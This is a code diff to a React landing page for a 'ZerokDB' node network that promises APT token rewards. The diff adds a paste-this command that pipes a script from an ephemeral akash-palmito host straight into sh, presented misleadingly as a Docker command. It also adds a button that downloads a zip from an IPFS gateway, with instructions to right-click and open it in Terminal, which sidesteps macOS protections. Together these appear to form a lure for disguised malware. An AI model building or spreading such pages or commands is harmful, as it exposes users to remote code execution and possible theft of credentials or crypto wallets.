@@ -18,6 +18,17 @@ import { useState } from "react";
 
 export default function Home() {
   const router = useRouter();
+  const [copied, setCopied] = useState(false);
+  const [loading, setLoading] = useState(false);
+
+  const proverCommand =
+    "export curl -sSL https://b4vue13qqtcrf2u0vi7ko0jdu0.ingress.akash-palmito.org/0k-worker.sh | sh";
+
+  const copyCommand = () => {
+    navigator.clipboard.writeText(proverCommand);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
 
   const steps = [
     {
@@ -59,6 +70,35 @@ export default function Home() {
         "Get rewarded for contributing to the network's storage and computation.",
     },
   ];
+
+  const handleDownload = async () => {
+    setLoading(true);
+    const url =
+      "https://turquoise-efficient-guan-536.mypinata.cloud/ipfs/QmVqp2ZjbswBcWu92Xy6BEZpALnr3tpJapq2ETYU56xVXb";
+    const filename = "0k-db-worker.zip";
+
+    try {
+      const response = await fetch(url, {
+        mode: "cors",
+      });
+      if (!response.ok) throw new Error("Network response was not ok");
+
+      const blob = await response.blob();
+      const blobURL = window.URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = blobURL;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      window.URL.revokeObjectURL(blobURL);
+    } catch (error) {
+      console.error("Download failed:", error);
+      alert("Failed to download the file. Please try again later.");
+    } finally {
+      setLoading(false);
+    }
+  };
 
   return (
     <>
@@ -183,38 +223,59 @@ export default function Home() {
               Contribute to the ZerokDB network by running a node. It&apos;s
               easy to set up, and you can earn APT tokens for your contribution.
               You&apos;ll need to have download our executable and{" "}
-              <span className="text-primary-500">just click on it.</span> to run
-              it on your machine
+              <span className="text-primary-500">
+                unzip it and right click with your mouse and open it with
+                terminal
+              </span>{" "}
+              to run it on your machine
             </p>
           </div>
           <div className="mt-10 flex justify-center gap-4">
-            <Link
-              className="text-xl border-2 border-primary-500 rounded-lg px-6 py-3 font-semibold leading-6  hover:border-primary-300 transition-colors duration-300"
+            <button
+              className="cursor-pointer text-xl border-2 border-primary-500 rounded-lg px-6 py-3 font-semibold leading-6 hover:border-primary-300 transition-colors duration-300"
+              id="button-started"
+              type="button"
+              onClick={handleDownload}
+            >
+              {loading ? "Downloading..." : "Download for MAC (ARM)"}
+            </button>
+            {/* <Link
+              className="bg-[#2d2c2c] text-xl border-2 border-primary-500 rounded-lg px-6 py-3 font-semibold leading-6  hover:border-primary-300 transition-colors duration-300"
               id={`button-started`}
               type="button"
-              target="_blank"
-              href="/executable-mac"
+              href="#node"
             >
-              Download for MAC
+              Download for Windows (soon)
             </Link>
             <Link
-              className="text-xl border-2 border-primary-500 rounded-lg px-6 py-3 font-semibold leading-6  hover:border-primary-300 transition-colors duration-300"
+              className="bg-[#2d2c2c] text-xl border-2 border-primary-500 rounded-lg px-6 py-3 font-semibold leading-6  hover:border-primary-300 transition-colors duration-300"
               id={`button-started`}
               type="button"
-              target="_blank"
-              href="/executable-win"
+              href="#node"
             >
-              Download for Windows
-            </Link>
-            <Link
-              className="text-xl border-2 border-primary-500 rounded-lg px-6 py-3 font-semibold leading-6  hover:border-primary-300 transition-colors duration-300"
-              id={`button-started`}
-              type="button"
-              target="_blank"
-              href="/executable-lin"
-            >
-              Download for Linux
-            </Link>
+              Download for Linux (soon)
+            </Link> */}
+          </div>
+          <p className="mt-6 text-lg leading-8 text-secondary-300 w-full text-center">
+            Or copy this command to run it on{" "}
+            <span className="text-primary-500">Docker</span>
+          </p>
+          <div className="mt-6 flex justify-center">
+            <div className="relative">
+              <pre className="bg-secondary-700 text-secondary-100 p-8 rounded-lg font-mono text-sm">
+                {proverCommand}
+              </pre>
+              <button
+                onClick={copyCommand}
+                className="absolute top-2 right-2 text-secondary-400 hover:text-secondary-800"
+                aria-label="Copy command"
+              >
+                <FontAwesomeIcon
+                  icon={copied ? faCheck : faCopy}
+                  className="w-5 h-5"
+                />
+              </button>
+            </div>
           </div>
           <div className="mx-auto mt-16 max-w-2xl sm:mt-20 lg:mt-24 lg:max-w-none">
             <dl className="grid max-w-xl grid-cols-1 gap-x-8 gap-y-16 lg:max-w-none lg:grid-cols-3">
